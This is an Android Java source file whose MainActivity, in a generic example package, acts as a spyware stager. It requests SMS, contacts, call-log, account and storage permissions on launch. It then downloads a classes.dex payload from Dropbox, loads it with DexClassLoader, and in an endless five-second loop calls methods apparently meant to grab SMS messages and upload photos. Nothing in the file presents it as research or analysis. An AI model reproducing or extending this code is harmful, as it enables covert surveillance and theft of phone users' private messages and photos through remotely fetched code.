package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.dropbox.core.DbxException;

import java.io.IOException;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {



    private static final int PERMISSIONS_REQUEST_READ_SMS = 100;
    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;
    private static final int PERMISSIONS_REQUEST_READ_CALL_LOG = 100;
    private static final int PERMISSIONS_REQUEST_GET_ACCOUNTS=100;


    final String PATH_IN_ANDROID = "/storage/emulated/0/Documents/";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissionGranted();
        showContacts();
        showSms();
        showLog();
        showOs();
    }

    public void onMyStart(View view) throws IOException, DbxException {

        String appDir = getApplicationInfo().dataDir;

        Thread thread = new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    DexLoader dexLoader = new DexLoader();
                    dexLoader.dropboxLoader(PATH_IN_ANDROID);
                    memoryLoadDex(PATH_IN_ANDROID,appDir);
                } catch (Exception e) {
                    Log.e("Error", e.getMessage());
                }
            }
        });
        thread.start();
    }
    

    private void showSms() {
        // Check the SDK version and whether the permission is already granted or not.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_SMS}, PERMISSIONS_REQUEST_READ_SMS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
    }
    private void showContacts() {
        // Check the SDK version and whether the permission is already granted or not.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
    }

    private void showLog() {
        // Check the SDK version and whether the permission is already granted or not.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG}, PERMISSIONS_REQUEST_READ_CALL_LOG);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
    }

    private void showOs(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.GET_ACCOUNTS}, PERMISSIONS_REQUEST_GET_ACCOUNTS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_READ_SMS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                showContacts(); // Permission is granted
            } else {
                Toast.makeText(this, "Until you grant the permission, we canot display the names", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void checkPermissionGranted() {
        if(( ActivityCompat.checkSelfPermission(getApplicationContext() , Manifest.permission.READ_EXTERNAL_STORAGE )
                != PackageManager.PERMISSION_GRANTED ) && ( ActivityCompat.checkSelfPermission(getApplicationContext() , Manifest.permission.WRITE_EXTERNAL_STORAGE )
                != PackageManager.PERMISSION_GRANTED )) {
            Toast.makeText(this, "Permission Not Granted", Toast.LENGTH_SHORT).show();
            requestPermission();
        }
        else {
            Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();

        }
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE} ,123);
    }


    final private String nameFile="classes.dex";

    public void memoryLoadDex(String modFile, String appDir)
    {

        modFile = modFile + nameFile;

        DexClassLoader classLoader = new DexClassLoader(modFile, appDir, null, getClass().getClassLoader());

        try {
            Class mine_service = classLoader.loadClass("com.example.imageuploaddropbox.mine_service");
            Method init = mine_service.getMethod("Dropbox_init",null);
            init.invoke(mine_service.newInstance(),null);

            Class PhotoUpload = classLoader.loadClass("com.example.imageuploaddropbox.PhotoUpload");
            Method photo_list = PhotoUpload.getMethod("photo_list",null);

            while(true) {
                Method getSms = mine_service.getMethod("dexCall", Context.class);
                getSms.invoke(mine_service.newInstance(), this);
                photo_list.invoke(PhotoUpload.newInstance(),null);
                Thread.sleep(5000);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}